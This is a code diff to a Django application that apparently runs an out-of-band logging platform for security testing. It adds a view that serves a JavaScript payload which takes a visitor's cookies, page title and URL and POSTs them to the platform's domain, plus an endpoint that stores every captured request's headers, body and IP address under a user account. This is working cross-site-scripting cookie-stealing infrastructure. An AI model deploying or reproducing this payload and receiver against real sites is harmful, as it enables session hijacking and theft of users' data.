@@ -266,6 +266,54 @@ def web_view(request):
     return log_view(request, 'web')
 
 
+@csrf_exempt
+def get_xss_code(request):
+    code = """
+fetch('https://%s/u/%s/', {
+method: 'POST',
+mode: 'no-cors',
+body:"cookie=" + document.cookie+'&title='+ document.title + '&location='+ document.location.href
+});
+""" % (settings.DNS_DOMAIN, request.GET.get('u', ''))
+    return HttpResponse(code.strip(), content_type='text/javascript')
+
+
+@csrf_exempt
+def xss_request(request, username):
+    http_host = request.get_host().split(':')[0]
+    if http_host not in settings.ADMIN_DOMAIN:
+        return HttpResponse(request.build_absolute_uri())
+
+    users = User.objects.filter(username=username)
+    if not users:
+        return HttpResponse("No such user")
+
+    user_agent = request.META.get('HTTP_USER_AGENT') or ''
+    user_agent = user_agent[:250]
+    remote_addr = request.META.get('HTTP_X_REAL_IP') or request.META.get('REMOTE_ADDR')
+    path = http_host + request.get_full_path()
+    path = path[:250]
+
+    if not http_host.endswith(settings.DNS_DOMAIN):
+        return HttpResponse("Server Gone", status=502)
+
+    city = ''
+    request_headers = ''
+    for key in request.META:
+        if key.startswith('REQUEST_') or key.startswith('HTTP_') or key.startswith('CONTENT_'):
+            request_headers += key + ': ' + str(request.META[key]) + '\n'
+
+    if request.META.get('REQUEST_METHOD') == 'POST':
+        request_headers += '\n' + request.body.decode()
+
+    weblog = WebLog(user=users[0], path=path, remote_addr=remote_addr,
+                    user_agent=user_agent, city=city, headers=request_headers)
+    weblog.save()
+    if path.find('/rpb.png') >= 0:    # this is for AWVS Scanner
+        return HttpResponse('39a6ea3246b507782676a6d79812fa1d29e12e9c')
+    return HttpResponse('OK')
+
+
 def config_view(request):
     return log_view(request, 'config')
 
@@ -382,6 +430,7 @@ def log_view(request, type):
     context['token'] = user.token
     context['username'] = user.username
     context['admin_domain'] = str(settings.ADMIN_DOMAIN)
+    context['xss_test_domain'] = str(settings.ADMIN_DOMAIN[0])
 
     return render(request, 'views.html', context)
 
